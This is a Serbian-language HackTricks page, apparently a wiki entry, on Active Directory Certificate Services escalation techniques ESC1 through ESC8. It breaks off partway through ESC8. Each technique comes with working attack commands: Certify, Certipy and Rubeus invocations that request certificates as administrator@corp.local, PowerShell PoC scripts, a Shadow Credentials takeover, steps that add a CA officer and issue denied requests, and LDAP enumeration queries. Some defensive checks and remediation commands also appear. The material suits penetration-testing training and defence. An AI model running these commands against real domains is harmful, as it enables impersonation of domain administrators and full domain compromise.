# AD CS eskalacija domena

{{#include ../../../banners/hacktricks-training.md}}


**Ovo je sažetak odeljaka o tehnikama eskalacije iz sledećih postova:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Pogrešno konfigurisani šabloni sertifikata - ESC1

### Objašnjenje

### Objašnjenje pogrešno konfigurisanih šablona sertifikata - ESC1

- **Enterprise CA dodeljuje prava za upis korisnicima sa niskim privilegijama.**
- **Odobrenje menadžera nije potrebno.**
- **Nisu potrebni potpisi ovlašćenog osoblja.**
- **Deskriptori bezbednosti na šablonima sertifikata su previše permisivni, što korisnicima sa niskim privilegijama omogućava da dobiju prava za upis.**
- **Šabloni sertifikata su konfigurisani tako da definišu EKU-ove koji olakšavaju autentikaciju:**
- Uključeni su identifikatori Extended Key Usage (EKU), kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ili bez EKU-a (SubCA).
- **Šablon omogućava podnosiocima zahteva da uključe subjectAltName u Certificate Signing Request (CSR):**
- Active Directory (AD) daje prednost vrednosti subjectAltName (SAN) u sertifikatu prilikom provere identiteta, ako je prisutna. To znači da se navođenjem SAN-a u CSR-u može zatražiti sertifikat za impersonaciju bilo kog korisnika (npr. administratora domena). Da li podnosilac zahteva može da navede SAN određuje se u AD objektu šablona sertifikata kroz svojstvo `mspki-certificate-name-flag`. Ovo svojstvo je bitmask, a prisustvo zastavice `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` omogućava podnosiocu zahteva da navede SAN.

> [!CAUTION]
> Opisana konfiguracija omogućava korisnicima sa niskim privilegijama da zatraže sertifikate sa proizvoljnim SAN-om, čime se omogućava autentikacija kao bilo koji principal domena putem Kerberos-a ili SChannel-a.

Ova funkcija se ponekad omogućava radi podrške dinamičkom generisanju HTTPS ili host sertifikata pomoću proizvoda ili servisa za deployment, ili zbog nedovoljnog razumevanja.

Napominje se da kreiranje sertifikata sa ovom opcijom pokreće upozorenje, što nije slučaj kada se postojeći šablon sertifikata (kao što je šablon `WebServer`, u kom je omogućena opcija `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) duplicira i zatim izmeni tako da uključuje authentication OID.<sup>[[6]](#references)</sup>

### Zloupotreba

Da biste **pronašli ranjive šablone sertifikata**, možete pokrenuti:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Da bi se **iskoristila ova ranjivost za lažno predstavljanje kao administrator**, može se pokrenuti:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Zatim možete konvertovati generisani **sertifikat u `.pfx`** format i ponovo ga koristiti za **autentifikaciju pomoću Rubeus ili certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binarni fajlovi "Certreq.exe" i "Certutil.exe" mogu se koristiti za generisanje PFX-a: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracija certificate templates unutar konfiguracione šeme AD Forest-a, konkretno onih koji ne zahtevaju odobrenje ili potpise, poseduju EKU za Client Authentication ili Smart Card Logon i imaju omogućenu oznaku `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, može se izvršiti pokretanjem sledećeg LDAP upita:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Pogrešno konfigurisani Certificate Templates - ESC2

### Objašnjenje

Drugi scenario zloupotrebe predstavlja varijaciju prvog:

1. Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
2. Zahtev za odobrenje menadžera je onemogućen.
3. Zahtev za autorizovanim potpisima je izostavljen.
4. Previše permisivan security descriptor na certificate template-u dodeljuje prava za certificate enrollment korisnicima sa niskim privilegijama.
5. **Certificate template je definisan tako da uključuje Any Purpose EKU ili nema EKU.**

**Any Purpose EKU** omogućava napadaču da dobije certificate za **bilo koju namenu**, uključujući client authentication, server authentication, code signing itd. Ista **technique korišćena za ESC3** može se upotrebiti za exploitovanje ovog scenarija.

Certificates bez **EKU-ova**, koji funkcionišu kao subordinate CA certificates, mogu se iskoristiti za **bilo koju namenu**, a mogu se **koristiti i za potpisivanje novih certificates**. Zbog toga napadač može da navede proizvoljne EKU-ove ili polja u novim certificates korišćenjem subordinate CA certificate-a.

Međutim, novi certificates kreirani za **domain authentication** neće funkcionisati ako subordinate CA nije trusted od strane objekta **`NTAuthCertificates`**, što je podrazumevano podešavanje. Ipak, napadač i dalje može da kreira **nove certificates sa bilo kojim EKU-om** i proizvoljnim vrednostima certificate-a. Oni bi potencijalno mogli biti **zloupotrebljeni** u širokom opsegu namena (npr. code signing, server authentication itd.) i mogli bi imati značajne posledice po druge aplikacije u mreži, kao što su SAML, AD FS ili IPSec.<sup>[[6]](#references)</sup>

Za enumeraciju template-a koji odgovaraju ovom scenariju u okviru konfiguracione šeme AD Forest-a, može se pokrenuti sledeći LDAP upit:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Pogrešno konfigurisani Enrolment Agent Templates - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **zloupotrebljava** **drugačiji EKU** (Certificate Request Agent) i **2 različita template-a** (zbog toga ima 2 skupa zahteva),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), poznat kao **Enrollment Agent** u Microsoft dokumentaciji, omogućava principalu da se **enroll-uje** za **sertifikat** **u ime drugog korisnika**.

**„enrollment agent“** se **enroll-uje** u takav **template** i koristi dobijeni **sertifikat da zajedno potpiše CSR u ime drugog korisnika**. Zatim **šalje** **zajedno potpisani CSR** CA-u, **enroll-ujući se** u **template** koji **dozvoljava „enroll on behalf of“**, a CA odgovara **sertifikatom koji pripada „drugom“ korisniku**.<sup>[[6]](#references)</sup>

**Zahtevi 1:**

- Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
- Zahtev za odobrenje menadžera je izostavljen.
- Ne postoji zahtev za autorizovanim potpisima.
- Security descriptor certificate template-a je previše permisivan i dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
- Certificate template sadrži Certificate Request Agent EKU, omogućavajući zahtevanje drugih certificate template-a u ime drugih principala.

**Zahtevi 2:**

- Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
- Odobrenje menadžera je zaobiđeno.
- Verzija šeme template-a je ili 1 ili veća od 2, a template navodi Application Policy Issuance Requirement koji zahteva Certificate Request Agent EKU.
- EKU definisan u certificate template-u dozvoljava autentikaciju domena.
- Ograničenja za enrollment agents nisu primenjena na CA-u.

### Zloupotreba

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) za zloupotrebu ovog scenarija:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Korisnici** kojima je dozvoljeno da **dobiju** **enrollment agent certificate**, templates u kojima je enrollment **agentima** dozvoljeno da izvrše enrollment, kao i **accounts** u čije ime enrollment agent može da postupa, mogu biti ograničeni pomoću enterprise CA-ova. To se postiže otvaranjem `certsrc.msc` **snap-in-a**, **desnim klikom na CA**, **klikom na Properties**, a zatim **odlaskom** na karticu „Enrollment Agents“.

Međutim, napominje se da je **podrazumevano** podešavanje za CA-ove „**Do not restrict enrollment agents**“. Kada administratori omoguće ograničenje enrollment agenata, tako što ga podese na „Restrict enrollment agents“, podrazumevana konfiguracija i dalje ostaje izuzetno permisivna. Ona omogućava grupi **Everyone** da izvrši enrollment u svim templates kao bilo koji korisnik.

### Windows-only PowerShell PoC-ovi sa Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) demonstrira ESC1 i ESC2/ESC3 bez korišćenja Certify ili Certipy. Njegove skripte kreiraju eksportabilni 2048-bitni RSA ključ pomoću `X509Enrollment` COM API-ja, konstruišu PKCS#10 zahtev, pronalaze prvi `pKIEnrollmentService` putem LDAP-a, prosleđuju ga kroz `CertificateAuthority.Request`, instaliraju odgovor u `Cert:\CurrentUser\My` i eksportuju PFX kodiran u Base64 formatu. ESC1 skripta dodaje UPN SAN koji bira napadač (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, vrednost `0xb`), dok ESC2/ESC3 skripte koriste prvi certificate za potpisivanje PKCS#7 on-behalf-of zahteva.<sup>[[27]](#references)</sup>
```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
-altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
-target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```
Skripte ispisuju Base64 vrednost **PFX**-a, koji uključuje privatni ključ, za direktnu upotrebu sa Rubeus-om. Nemojte ga zameniti sa `[Convert]::ToBase64String($cert.RawData)`: `RawData` kodira samo javni sertifikat i ne može da potpiše PKINIT zahtev.<sup>[[5]](#references)[[27]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```
## Kontrola pristupa ranjivom predlošku sertifikata - ESC4

### **Objašnjenje**

**security descriptor** na **predlošcima sertifikata** definiše **dozvole** koje određeni **AD principals** imaju u vezi sa predloškom.

Ako **attacker** poseduje potrebne **dozvole** za **izmenu** **predloška** i **uvođenje** bilo kakvih **iskoristivih pogrešnih konfiguracija** navedenih u **prethodnim odeljcima**, moguće je izvršiti eskalaciju privilegija.

Značajne dozvole koje se primenjuju na predloške sertifikata uključuju:<sup>[[6]](#references)</sup>

- **Owner:** Daje implicitnu kontrolu nad objektom, omogućavajući izmenu bilo kog atributa.
- **FullControl:** Omogućava potpunu kontrolu nad objektom, uključujući mogućnost izmene bilo kog atributa.
- **WriteOwner:** Omogućava promenu vlasnika objekta u principal-a pod kontrolom napadača.
- **WriteDacl:** Omogućava podešavanje kontrola pristupa, što potencijalno napadaču daje FullControl.
- **WriteProperty:** Omogućava izmenu bilo kog svojstva objekta.

### Zloupotreba

Da biste identifikovali principale sa pravima izmene nad predlošcima i drugim PKI objektima, izvršite enumeraciju pomoću Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Primer privesc-a kao prethodni:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 je kada korisnik ima privilegije pisanja nad certificate template-om. Ovo se, na primer, može zloupotrebiti za prepisivanje konfiguracije certificate template-a, čime template postaje ranjiv na ESC1.

Kao što možemo videti na putanji iznad, samo `JOHNPC` ima ove privilegije, ali naš korisnik `JOHN` ima novu `AddKeyCredentialLink` vezu ka `JOHNPC`. Pošto je ova tehnika povezana sa certificate-ima, implementirao sam i ovaj napad, koji je poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Evo kratkog pregleda Certipy-jeve `shadow auto` komande za preuzimanje NT hash-a žrtve.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** može da prepiše konfiguraciju certificate template-a jednom komandom. Po **default-u**, Certipy će **prepisati** konfiguraciju tako da bude **vulnerable to ESC1**. Takođe možemo navesti **`-save-old` parameter da sačuvamo staru konfiguraciju**, što će biti korisno za **vraćanje** konfiguracije nakon našeg napada.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kontrola pristupa ranjivim PKI objektima - ESC5

### Objašnjenje

Opsežna mreža međusobno povezanih odnosa zasnovanih na ACL-ovima, koja obuhvata nekoliko objekata pored certificate templates i certificate authority, može uticati na bezbednost celokupnog AD CS sistema. Ovi objekti, koji mogu značajno uticati na bezbednost, obuhvataju:

- AD computer object CA servera, koji može biti kompromitovan mehanizmima kao što su S4U2Self ili S4U2Proxy.
- RPC/DCOM server CA servera.
- Bilo koji descendant AD object ili container unutar određene putanje containera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja obuhvata, između ostalog, containere i objekte kao što su Certificate Templates container, Certification Authorities container, NTAuthCertificates object i Enrollment Services Container.

Bezbednost PKI sistema može biti ugrožena ako napadač sa niskim privilegijama uspe da preuzme kontrolu nad bilo kojom od ovih kritičnih komponenti.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objašnjenje

Tema obrađena u [**CQure Academy postu**](https://cqureacademy.com/blog/enhanced-key-usage) takođe se bavi posledicama **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag-a, kako ih je opisao Microsoft. Ova konfiguracija, kada je aktivirana na Certification Authority (CA), omogućava uključivanje **vrednosti koje definiše korisnik** u **subject alternative name** za **bilo koji zahtev**, uključujući zahteve kreirane iz Active Directory®. Posledično, ova mogućnost omogućava **napadaču** da se enroll-uje preko **bilo kog template-a** podešenog za domain **authentication**—konkretno, onih koji dozvoljavaju enrollment **neprivilegovanih** korisnika, kao što je standardni User template. Na taj način se može pribaviti certificate koji napadaču omogućava da se autentifikuje kao domain administrator ili **bilo koji drugi aktivni entitet** unutar domena.<sup>[[9]](#references)</sup>

**Napomena**: Način dodavanja **alternativnih imena** u Certificate Signing Request (CSR), pomoću argumenta `-attrib "SAN:"` u `certreq.exe` (koji se naziva „Name Value Pairs“), razlikuje se od strategije exploitation-a SAN-ova u ESC1. Razlika je u tome **kako su informacije o nalogu enkapsulirane**—u okviru certificate attribute-a, a ne extension-a.

### Abuse

Da bi proverile da li je ovo podešavanje aktivirano, organizacije mogu da koriste sledeću komandu sa `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ova operacija u suštini koristi **remote registry access**, stoga bi alternativni pristup mogao biti:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Alati kao što su [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) mogu da otkriju ovu pogrešnu konfiguraciju i da je iskoriste:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Za izmenu ovih podešavanja, pod pretpostavkom da posedujete **administrativna prava nad domenom** ili ekvivalentna prava, sledeća komanda može da se izvrši sa bilo koje radne stanice:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Da biste onemogućili ovu konfiguraciju u svom okruženju, flag se može ukloniti pomoću:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nakon bezbednosnih ažuriranja iz maja 2022. godine, novokreirani **sertifikati** sadržaće **bezbednosnu ekstenziju** koja uključuje **svojstvo `objectSid` podnosioca zahteva**. Kod ESC1, ovaj SID se izvodi iz navedenog SAN-a. Međutim, kod **ESC6**, SID odgovara **`objectSid` podnosioca zahteva**, a ne SAN-u.\
> Za iskorišćavanje ESC6 neophodno je da sistem bude podložan na ESC10 (Weak Certificate Mappings), koji daje prednost **SAN-u u odnosu na novu bezbednosnu ekstenziju**.

## Ranjiva kontrola pristupa Certificate Authority - ESC7

### Napad 1

#### Objašnjenje

Kontrola pristupa Certificate Authority održava se putem skupa dozvola koje regulišu radnje CA-a. Ove dozvole se mogu pregledati tako što pristupite `certsrv.msc`, kliknete desnim tasterom miša na CA, izaberete properties, a zatim otvorite karticu Security. Pored toga, dozvole se mogu enumerisati korišćenjem modula PSPKI i komandi kao što je:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Ovo pruža uvid u primarna prava, odnosno **`ManageCA`** i **`ManageCertificates`**, koja odgovaraju ulogama „CA administrator“ i „Certificate Manager“.<sup>[[6]](#references)</sup>

#### Zloupotreba

Posedovanje prava **`ManageCA`** nad certificate authority omogućava principalu da daljinski manipuliše podešavanjima koristeći PSPKI. To uključuje uključivanje zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, čime se omogućava navođenje SAN-a u bilo kom template-u, što predstavlja ključni aspekt domain escalation-a.

Pojednostavljenje ovog procesa moguće je korišćenjem PSPKI cmdlet-a **Enable-PolicyModuleFlag**, koji omogućava izmene bez direktne interakcije sa GUI-jem.

Posedovanje prava **`ManageCertificates`** omogućava odobravanje zahteva na čekanju, čime se efektivno zaobilazi zaštita „CA certificate manager approval“.

Kombinacija modula **Certify** i **PSPKI** može se koristiti za slanje zahteva, odobravanje i preuzimanje sertifikata:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Napad 2

#### Objašnjenje

> [!WARNING]
> U **prethodnom napadu** su korišćene dozvole **`Manage CA`** da bi se **omogućila** zastavica **EDITF_ATTRIBUTESUBJECTALTNAME2** i izveo **ESC6 napad**, ali ovo neće imati nikakav efekat dok se CA servis (`CertSvc`) ne restartuje. Kada korisnik ima pravo pristupa **`Manage CA`**, takođe mu je dozvoljeno da **restartuje servis**. Međutim, to **ne znači da korisnik može udaljeno da restartuje servis**. Pored toga, **ESC6 možda neće raditi odmah** u većini zakrpljenih okruženja zbog bezbednosnih ažuriranja iz maja 2022.

Zbog toga je ovde predstavljen drugi napad.

Preduslovi:

- Samo dozvola **`ManageCA`**
- Dozvola **`Manage Certificates`** (može se dodeliti iz **`ManageCA`**)
- Certificate template **`SubCA`** mora biti **omogućen** (može se omogućiti iz **`ManageCA`**)

Tehnika se oslanja na činjenicu da korisnici sa pravima pristupa `Manage CA` _i_ `Manage Certificates` mogu da **izdaju neuspešne zahteve za sertifikat**. Certificate template **`SubCA`** je **ranjiv na ESC1**, ali se u njega mogu upisati **samo administratori**. Zbog toga **korisnik** može da **zatraži** upis u **`SubCA`** - što će biti **odbijeno** - ali će ga **upravljač naknadno izdati**.<sup>[[6]](#references)</sup>

#### Zloupotreba

Možete sebi **dodeliti pravo pristupa `Manage Certificates`** tako što ćete dodati svoj korisnički nalog kao novog službenika.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template može biti **omogućen na CA-u** pomoću parametra `-enable-template`. Podrazumevano, `SubCA` template je omogućen.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ako smo ispunili preduslove za ovaj napad, možemo početi tako što ćemo **zatražiti sertifikat zasnovan na `SubCA` template-u**.

**Ovaj zahtev će biti odbijen**, ali ćemo sačuvati privatni ključ i zabeležiti ID zahteva.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Sa našim dozvolama **`Manage CA`** i **`Manage Certificates`**, zatim možemo da **izdamo zahtev za neizdati sertifikat** pomoću komande `ca` i parametra `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I na kraju, možemo **preuzeti izdat certificate** pomoću komande `req` i parametra `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Napad 3 – Zloupotreba ekstenzije Manage Certificates (SetExtension)

#### Objašnjenje

Pored klasičnih ESC7 zloupotreba (omogućavanje EDITF atributa ili odobravanje zahteva na čekanju), **Certify 2.0** je otkrio potpuno novi primitive koji zahteva samo ulogu *Manage Certificates* (poznatu i kao **Certificate Manager / Officer**) na Enterprise CA.<sup>[[3]](#references)</sup>

RPC metoda `ICertAdmin::SetExtension` može da se izvrši iz bilo kog principal-a koji poseduje *Manage Certificates*. Iako su legitimni CA-ovi ovu metodu tradicionalno koristili za ažuriranje ekstenzija na zahtevima koji su **pending**, napadač može da je zloupotrebi kako bi **dodao *non-default* ekstenziju sertifikata** (na primer prilagođeni OID za *Certificate Issuance Policy*, kao što je `1.1.1.1`) zahtevu koji čeka odobrenje.

Pošto ciljani template **ne definiše podrazumevanu vrednost za tu ekstenziju**, CA neće prepisati vrednost koju kontroliše napadač kada zahtev kasnije bude izdat. Dobijeni sertifikat zato sadrži ekstenziju koju je izabrao napadač, što može:

* Ispuniti zahteve za Application / Issuance Policy drugih ranjivih template-a (što dovodi do eskalacije privilegija).
* Ubaciti dodatne EKU-ove ili policy-je koji sertifikatu daju neočekivano poverenje u sistemima trećih strana.

Ukratko, *Manage Certificates* – koji se ranije smatrao „manje moćnom“ polovinom ESC7 – sada može da se iskoristi za potpunu eskalaciju privilegija ili dugoročnu perzistenciju, bez menjanja CA konfiguracije i bez zahteva za restriktivnijim pravom *Manage CA*.

#### Zloupotreba primitive-a pomoću Certify 2.0

1. **Pošaljite zahtev za sertifikat koji će ostati *pending*.**  Ovo se može postići pomoću template-a koji zahteva odobrenje manager-a:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Dodajte prilagođenu ekstenziju zahtevu na čekanju** pomoću nove `manage-ca` komande:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ako template već ne definiše ekstenziju *Certificate Issuance Policies*, navedena vrednost će biti sačuvana nakon izdavanja.*

3. **Izdajte zahtev** (ako vaša uloga takođe poseduje prava za odobravanje u okviru *Manage Certificates*) ili sačekajte da ga operator odobri. Nakon izdavanja, preuzmite sertifikat:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Dobijeni sertifikat sada sadrži maliciozni issuance-policy OID i može se koristiti u narednim napadima (npr. ESC13, eskalacija domena itd.).

> NAPOMENA:  Isti napad može da se izvrši pomoću Certipy ≥ 4.7 kroz `ca` komandu i parametar `-set-extension`.

## NTLM Relay ka AD CS HTTP Endpoint-ima – ESC8

### Objašnjenje

> [!TIP]
> U okruženjima u kojima je **AD CS instaliran**, ako postoji **ranjiv web enrollment endpoint** i objavljen je najmanje jedan **certificate template** koji dozvoljava enrollment domen računara i client authentication (kao što je podrazumevani **`Machine`** template), **napadač može da kompromituje bilo koji računar na kojem je aktivan spooler servis**!

AD CS podržava nekoliko **HTTP-based enrollment metoda**, koje su dostupne kroz dodatne server role koje administratori mogu instalirati. Ovi interfejsi za HTTP-based certificate enrollment podložni su **NTLM relay napadima**. Napadač sa **kompromitovanog računara može da se predstavi kao bilo koji AD nalog koji se autentifikuje putem dolaznog NTLM-a**. Dok se predstavlja kao nalog žrtve, napadač može da pristupi ovim web interfejsima i **zatraži client authentication sertifikat pomoću `User` ili `Machine` certificate template-a**.

- **Web enrollment interfejs** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`) podrazumevano koristi samo HTTP, što ne pruža zaštitu od NTLM relay napada. Pored toga, eksplicitno dozvoljava samo NTLM autentifikaciju kroz svoj Authorization HTTP header, zbog čega sigurniji authentication metodi, kao što je Kerberos, nisu primenljivi.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service i **Network Device Enrollment Service** (NDES) podrazumevano podržavaju negotiate authentication putem svog Authorization HTTP header-a. Negotiate authentication podržava i **Kerberos** i **NTLM**, omogućavajući napadaču da tokom relay napada **spusti autentifikaciju na NTLM**. Iako ovi web servisi podrazumevano omogućavaju HTTPS, sam HTTPS **ne štiti od NTLM relay napada**. Zaštita HTTPS servisa od NTLM relay napada moguća je samo kada se HTTPS kombinuje sa channel binding-om. Nažalost, AD CS ne aktivira Extended Protection for Authentication na IIS-u, što je potrebno za channel binding.<sup>[[6]](#references)</sup>

Čest **problem** kod NTLM relay napada jeste **kratko trajanje NTLM sesija** i nemogućnost napadača da komunicira sa servisima koji **zahtevaju NTLM signing**.

Ipak, ovo ograničenje se prevazilazi iskorišćavanjem NTLM relay napada za dobijanje sertifikata za korisnika, jer period važenja sertifikata određuje trajanje sesije, a sertifikat može da se koristi sa servisima koji **zahtevaju NTLM signing**. Uputstva za korišćenje ukradenog sertifikata potražite na:


{{#ref}}
account-persistence.md
{{#endref}}

Drugo ograničenje NTLM relay napada jeste to što **računar pod kontrolom napadača mora da bude autentifikovan od strane naloga žrtve**. Napadač može ili da čeka ili da pokuša da **iznudi** ovu autentifikaciju:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Zloupotreba**

[**Certify**](https://github.com/GhostPack/Certify)`s `cas` enumeriše **omogućene HTTP AD CS endpoint-e**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

